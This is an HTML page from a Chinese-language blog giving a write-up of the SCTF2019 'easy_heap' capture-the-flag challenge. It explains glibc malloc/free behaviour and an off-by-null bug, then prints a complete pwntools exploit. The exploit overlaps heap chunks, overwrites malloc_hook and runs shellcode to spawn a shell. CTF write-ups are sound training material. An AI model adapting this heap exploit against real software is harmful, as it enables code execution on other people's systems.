@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="John Doe">
+
+
+
+
+
+<title>SCTF2019easy_heap | hash_hash的博客</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">hash_hash&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/friend">Friends</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">hash_hash&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/friend">Friends</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">SCTF2019easy_heap</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">John Doe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 14, 2022&nbsp;&nbsp;7:31:10</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Pwn/">Pwn</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>[附件](<a target="_blank" rel="noopener" href="https://github.com/hash-hash/pwn/tree/main/pwn%E9%A2%98%E9%99%84%E4%BB%B6/2019sctf-easyheap">pwn&#x2F;pwn题附件&#x2F;2019sctf-easyheap at main · hash-hash&#x2F;pwn (github.com)</a>)</p>
+<p>new knowledge:</p>
+<ul>
+<li>top chunk的前一个chunk是free状态时会触发合并机制</li>
+<li>mmap函数作用</li>
+<li>利用unsortedbin中存有main_arena+offset的地址单字节覆盖指向malloc_hook</li>
+</ul>
+<p>多调试了只能说，算次序算的头疼，也算是了解了堆上一些神奇的操作流程</p>
+<p>首先得了解一下malloc和free调用时筛选chunk的流程</p>
+<p>下面摘自<a target="_blank" rel="noopener" href="https://detlfy.github.io/2021/11/11/Linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/">文章</a>关于malloc和free的一段便于理解的表述方式</p>
+<p>malloc:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">计算真正chunk的大小（算上头部长度，对齐）;</span><br><span class="line"><span class="keyword">if</span>(在fastbin范围内)</span><br><span class="line">    <span class="keyword">if</span>(对应的bin链表中有chunk)</span><br><span class="line">        分配给用户;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(在smallbin范围内)</span><br><span class="line">    <span class="keyword">if</span>(对应大小的bin链表中有chunk)</span><br><span class="line">        分配给用户;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(unsortedbin中有chunk)</span><br><span class="line">    <span class="keyword">while</span>(从尾部取出第一个chunk遍历)&#123;</span><br><span class="line">        <span class="keyword">if</span>(大小满足)</span><br><span class="line">            <span class="keyword">if</span>(切分后剩余大小&gt;min_size)&#123;</span><br><span class="line">                切分快，返回给用户;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                直接全部返回给用户;    </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            把这个chunk放入smallbin或largebin对应的链表中;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(大小在largebin范围内)</span><br><span class="line">    <span class="keyword">if</span>(对应的bin链表中有符合的chunk)</span><br><span class="line">        找到满足需求最小的chunk，切分快返回，剩下的放进unsortedbin中;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(再次遍历smallbin或largebin找到best fit的chunk)</span><br><span class="line">        返回给用户;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(topchunk中够)</span><br><span class="line">    从topchunk中切割给用户;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    mmap系统调用;</span><br></pre></td></tr></table></figure>
+
+<p>free:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">free</span>的chunk大小属于fastbin)</span><br><span class="line">    放入fastbin;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(是mmap分配的)</span><br><span class="line">    调用munmap回收;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(前一个chunk是空闲的)</span><br><span class="line">        向前合并;</span><br><span class="line">    <span class="keyword">if</span>(后一个chunk是topchunk||后一个chunk是<span class="built_in">free</span>的)</span><br><span class="line">        向后合并;</span><br><span class="line">    放入unsortedbin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里反编译的时候函数的名字都没有明确的标识，逆向的时候用ida改下便于后面分析</p>
+<p>检查保护全开</p>
+<p>分析主程序菜单的功能有malloc，free以及fill</p>
+<p>首先看add</p>
+<img src="/2022/05/14/SCTF2019easy-heap/pic1.png" class>
+
+<p>没有漏洞</p>
+<p>再看del</p>
+<img src="/2022/05/14/SCTF2019easy-heap/pic2.png" class>
+
+<p>将指针free后将array中的数据置空，也没漏洞</p>
+<p>最后看fill</p>
+<img src="/2022/05/14/SCTF2019easy-heap/pic3.png" class>
+
+<p>跟进edit很容易发现问题，虽然对输入进行了控制但是最后会在结尾补一个\x00，这就导致了off by null漏洞，利用此漏洞实现chunk overlap，有一个需要留意的是在函数刚开始内存映射了一段可读可写可执行的区域，并打印了地址，后面就利用fastbin attack在这段区域写shellcode即可</p>
+<blockquote>
+<p>想法是先malloc四块chunk，A-B-C-D，然后将Afree掉在C处利用off by null漏洞改写D的prev_size指针的同时修改inuse位，在Dfree的同时触发向前合并机制，注意首先需要freeA否则会报错，所以为了触发合并需要使A不在fastbin或tcache内，所以malloc一个较大size的A，再利用unsortedbin里chunk的分割机制把AB部分分割出来再分割CD(为了使C中带main_arena地址)，也就是对于B，C而言均有两指针指向，后面就fastbin attack就行(这里libc版本是2.27用的tcache机制更容易利用)</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&#x27;redirect.do-not-trust.hacking.run&#x27;,10300)</span></span><br><span class="line">p=process(<span class="string">&#x27;./easy_heap&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./easy_heap&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line"> p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line"> p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line"> p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"> p.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Mmap: &#x27;</span>)</span><br><span class="line">mmap=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;mmap:&#x27;</span>+<span class="built_in">hex</span>(mmap))</span><br><span class="line">add(<span class="number">0x418</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>)</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x490</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload1)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x450</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x418</span>+p64(<span class="number">41</span>)+p64(mmap)</span><br><span class="line">edit(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x38</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">edit(<span class="number">2</span>,shellcode)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x520</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;\x30&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#6</span></span><br><span class="line">edit(<span class="number">6</span>,p64(mmap))</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>John Doe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://hash-hash.github.io/2022/05/14/SCTF2019easy-heap/">https://hash-hash.github.io/2022/05/14/SCTF2019easy-heap/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/off-by-null/"># off by null</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2022/05/12/easyheap/">easyheap</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© John Doe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
